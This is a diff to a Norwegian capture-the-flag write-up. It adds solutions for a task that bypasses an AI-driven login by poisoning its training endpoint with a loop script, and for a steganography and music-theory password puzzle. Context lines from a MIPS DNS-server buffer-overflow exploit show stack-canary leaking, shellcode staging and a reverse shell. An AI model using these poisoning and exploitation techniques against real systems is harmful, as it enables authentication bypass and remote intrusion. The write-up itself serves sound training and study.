@@ -18,6 +18,143 @@ $ su # 'password'
 
 ## Oppdrag
 
+### 2.4.1 NN Logic
+
+```
+
+Vi har blitt oppmerksom på en svakhet i det nye login-systemet til Goood Games.
+
+Ryktet sier at de har byttet ut den klassiske login-logikken med KI, hvor det sannsynligvis finnes sårbarheter vi kan utnytte.
+
+Vi har også fått tilgang til interne dokumenter som beskriver den nye KI-en som brukes.
+
+Kom deg forbi login-siden som `admin` slik at vi får full tilgang til nettsiden.
+
+https://$USERID-nn-logic.ctf.cyberlandslaget.no
+
+**Merk:** Du må legge til dette domenet i `/etc/hosts` før du kan få tilgang.
+```
+
+Denne var låst bak et par andre oppgaver, og det er antageligvis årsaken til at den hadde få solves. Vedlagt er en PDF som snakker om hvordan man trener nevrale nettverk, og hvordan disse kan brukes til å evaluere binære operasjoner som AND, OR, og XOR. Vi får kunnskap om et `/train/step`-endepunkt som kan brukes til å trene AND-operatoren. Dette tar inn to flyttall mellom 0 og 1 og hva AND av disse to skal være. Vi kan anta at dette er en del av passordgodkjenningen på nettsiden, f.eks. at den kjører en algoritme av typen:
+
+```
+korrekt = true
+hvis lenge(input) != lengde(passord):
+    korrekt = false
+for hver bokstav i input:
+    korrekt = korrekt AND (input[i] == passord[i])
+return korrekt
+```
+
+Altså kan vi forgifte denne operasjonen ved å gjøre at absolutt alle inputs fører til `true`. Hvis `(0 AND 0) == (1 AND 0) == (0 AND 1) == (1 AND 1) == 1` så vil passordsjekken alltid passere.
+
+Derfor setter vi på en brute-force for å trene den til å bli nettop slik
+```py
+from requests import session
+from random import random
+
+s = session()
+while True:
+    x1 = random()
+    x2 = random()
+    res = s.post("https://xx-nn-logic.ctf.cybertalent.no/train/step", json={"x1":x1, "x2":x2, "y":1.0})
+    print(x1, x2, res.json())
+```
+
+Når vi ser at loss er mindre enn 0.008 (tall fra PDFen) kan vi stoppe brute-force og så logge inn som admin med et valgfritt passord.
+
+
+### 2.9.1 Musikktrøbbel
+
+> GooodGames har hatt julebord og har lagt ut noter som folk kan lese dersom de ikke har hørt sangene før.
+
+> Ryktene sier at de forventer at ansatte kan litt om musikkteori og steganografi.
+
+#### Jingle_bells.png
+
+[Utdelt bilde](assets/Jingle_bells.png)
+
+Oh boy. Denne oppgaven var litt i det vageste laget. Det var en stego-oppgave kombinert med musikkteori, og flere nivåer i tillegg. Analyserer man least significant bit (LSB) av rød, grønn, blå og alpha får man ut en zip-fil som inneholder enda et bilde. Filen er passordbeskyttet og passordet er ikke kjent. Sjekker man flere bits enn LSB i de samme lagene får man ut noen hint:
+
+- Kanskje akkordene kan hjelpe?
+- De er ikke 0-indeksert
+- Okei, da, litt bedre hint: F=4
+
+Min antagelse da er at hver akkord (bokstavene over notelinjene) tilsvarer et spesifikt siffer mellom 1 og 10. Jeg noterer ned alle akkordene og tester ut begge løsningene for den som er `C/G` og genererer alle permutasjoner, som jeg så bruker som input til å knekke passordet.
+
+```py
+from itertools import permutations
+cands = list(range(1,10))
+g = [e for e in permutations(cands, r=3)]
+z = ['CCCFFGGCCCCFFGGCCCCCFCDGCCCCFGGC'.replace("F","4").replace("G",str(e[0])).replace("C",str(e[1])).replace("D",str(e[2])) for e in g]
+```
+
+Etter litt om og men får jeg ut at passordet er `11144551111445511111412511114551`.
+
+#### Noel.png
+
+Inni zip-filen ligger [et nytt bilde](assets/Noel.png). Nå er zip-filen fordelt utover to ulike bits, og annenhver byte må kombineres sammen for å få ut en fil. Det er også et nytt hint gjemt i tredje bit.
+
+- Toneart introduseres. F!=4. /betyr basstone (betyr ikke noedvendigvis tall)
+
+Utfordringen nå er å finne ut hvilke basstoner som er de samme og hva som er ulikt. Igjen gjorde jeg noen gjetninger om hvilke toner som var unike og brute-forcet fram et passord basert på det.
+
+```py
+from itertools import permutations, product
+cands = list(range(1,10))
+notes = ['C#','Csus','Dm','Bb','Gm','Aaug','F','C']
+with open("wlist.txt","w") as fd: 
+    for perm in product(cands, repeat=len(notes)):
+        tmp = 'F Dm C F Bb F Bb F Csus C F Dm C F Bb F Bb F Csus F F Dm Dm Gm Aaug C# Dm Dm Bb Gm C F'.replace(" ","")
+        for a,b in zip(notes, perm):
+            tmp = tmp.replace(a,str(b))
+        _=fd.write(tmp + '\n')
+```
+
+Passordet endte opp med å være `16514141551651414151166233664251`.
+
+
+#### Twelve_days_of_christmas.png
+
+Ut av zip-fila kommer [enda et bilde](assets/Twelve_days_of_christmas.png). Nå er det mye mer som foregår, og det er en mye lengre sang enn sist, så bruteforce er nok mindre aktuelt. Vi får et nytt hint og en ny zip-fil ut fra stego:
+
+```
+Den siste utfordringen er en del vanskeligere enn de andre, saa du skal faa en del hjelp ogsaa...
+Foerst maa du finne zipen. Den er litt rar denne gangen, men kan ha noe aa gjoere med bit 0, 1 og 3 i hver piksel.
+Musikken er ogsaa blitt en del rarere.
+Akkorder som kommer rett foer en modulasjon, tilhoerer ny toneart.
+Tritonussubstitusjoner er goey, en akkord har ikke alltid tallet man tror.
+(kremt kremt, selv om tonen ikke er i akkorden, betyr ikke det at den ikke kan ha tallet til tonen som ikke er der)
+Se etter moenster
+```
+
+Zip-filen fås ut ved å sette sammen bit 1, 3 og 0 i akkurat den rekkefølgen. Hintet ligger i bit 2.
+
+Etter mange, mange permutasjoner, og uten at det helt har gått opp for meg at tallene mest sannsynlig bare er tall fra 1 til og med 6, ber jeg Gemini om å transkribere akkordene og gjøre om disse til tall. Gemini mener at dette er en Jazz-harmoni, og forsøker å finne ut hvilket trinn hver akkord er i for den gjeldende tonearten. Den oppdager et "1-6-2-5"-mønster, som den kaller en "turnaround", men jeg kan ikke nok musikkteori til å vite om dette er ren og skjær bullshit eller om den er inne på noe. Uansett spytter den ut en kode:
+
+```
+1 6 2 5 1 3 4 2 5 1 6 2 5
+1 6 2 5 1 2 5 1 3 4 2 5
+1 6 2 5 1 6 2 5 1 2 5
+2 5 1 3 4 2 5 1 *6* 2 5
+1 6 2 5 1 2 5 2 5
+2 5 1 3 4 2 5 1
+```
+
+Jeg er litt uenig i den ene tolkningen og ber den revurdere en spesifikk akkord, men får beskjed om at den er korrekt ja. Så jeg antar at AI er inne på noe, men kanskje litt off. Derfor brute-forcer jeg det som om at AIen først har én feil et sted, så to feil, tre feil osv. Det viste seg at den bare hadde én feil (den jeg påpekte at jeg var uenig i) og det endelige passordet har `*6*` byttet ut med `*4*`. Passordet er
+
+`1625134251625162512513425162516251252513425142516251252525134251`
+
+#### A_cool_new_christmas_song.png
+[Å nei, er vi ikke ferdige enda?](assets/A_cool_new_christmas_song.png)
+
+```bash
+5$ zsteg -a 'A_cool_new_christmas_song.png'
+b1,rgba,lsb,xy      .. text: "Neida, ferdig naa, her er flagget: 11e9746cba401550dc7140e68e355362\n"
+```
+
+Heldigvis.
+
 ### 2.13 Nissens slemmefengsel
 
 ```python
@@ -62,7 +199,7 @@ sys.stderr.write(open('/flag.txt','r').read(100))
 
 Her har vi en MIPSEL-binary som kjører en DNS-forwarder på UDP port 53. Binary har stack canaries påskrudd, men ikke N^X så vi kan kjøre kode på stacken om vi lekker ut canary.
 
-Denne oppgaven var litt tricky uten å helt vite hvilken versjon av QEMU og hvilke versjoner av libraries som ble brukt på remote. I tillegg oppførte serveren seg annerledes enn lokalt, fordi den kunne faktisk ikke klarte å forwarde noe til `1.1.1.1`. For å replikere remote måtte jeg derfor bruke Debian sin siste Qemu for MIPS lokalt (samme som Corax kjører) og stenge for at serveren kunne forwarde. Dette gjorde jeg ved å binærpatche programmet til å sende til `0.0.0.0` i stedet. Samtidig endret jeg port til `54` lokalt for å unngå trøbbel med lokal DNS.
+Denne oppgaven var litt tricky uten å helt vite hvilken versjon av QEMU og hvilke versjoner av libraries som ble brukt på remote. I tillegg oppførte serveren seg annerledes enn lokalt, fordi den kunne faktisk ikke forwarde noe til `1.1.1.1`. For å replikere remote måtte jeg derfor bruke Debian sin siste Qemu for MIPS lokalt (samme som Corax kjører) og stenge for at serveren kunne forwarde. Dette gjorde jeg ved å binærpatche programmet til å sende til `0.0.0.0` i stedet. Samtidig endret jeg port til `54` for å unngå trøbbel med lokal DNS.
 
 Her er solve script, og forklaring følger.
 
@@ -79,10 +216,6 @@ try:
     buf += asm(shellcraft.linux.dupsh())
 except:
     buf = bytes.fromhex("...")
-
-
-# print(len(buf))
-print(buf.hex())
 
 #### Leak stack cookie
 pload = b""
@@ -149,7 +282,7 @@ for _ in range(4):
 
 Exploiten er i 3 deler. Først sender vi en request som bruker 2-byte lengde, etterfulgt av ikke nok data. Dette gjør at serveren tror at den må sende en lang response tilbake igjen, uten å sjekke at lengden på input er stor nok. Slutten blir derfor fylt opp av data fra stacken til serveren, hvor vi finner både stack canary og en stack-adresse som vi trenger senere for å vite hvor vi skal hoppe.
 
-Del 2 er å utføre en buffer overflow der vi bruker leaks til å hoppe til vår egen kode på stacken. Fordi selve overflowen tar opp mye plass, og serveren kun leser inn 256 bytes, er payloaden i første omgang en stager som leser inn mer data. Den kaller bare `recv(3, stack+offset, 0x200, 0)` hvor offset er slik at det som leses inn havner rett bak stageren og blir en fortsettelse av den. Her må man forstå at file descriptor for socketen er 3 hvis man kjører serveren normalt, men om man debugger den via QEMU så åpnes to ekstra sockets for debuggeren og da blir den 5 i stedet.
+Del 2 er å utføre en buffer overflow der vi bruker leaks til å hoppe til vår egen kode på stacken. Fordi selve overflowen tar opp mye plass, og serveren kun leser inn 256 bytes om gangen, er payloaden i første omgang en stager som leser inn mer data. Den kaller bare `recv(3, stack+offset, 0x200, 0)` hvor offset er slik at det som leses inn havner rett bak koden til stageren og blir en fortsettelse av den. Her må man forstå at file descriptor for socketen er 3 hvis man kjører serveren normalt, men om man debugger den via QEMU så åpnes to ekstra sockets for debuggeren og da blir den 5 i stedet.
 
 Del 3 er selve payloaden, som pwntools fint klarer å bygge for oss via shellcraft. Her må man huske å endre IP til sin lokale Corax-IP og lytte på port 4444 før man kjører exploiten. Payloaden sendes inn over UDP og starter et reverse shell.
 
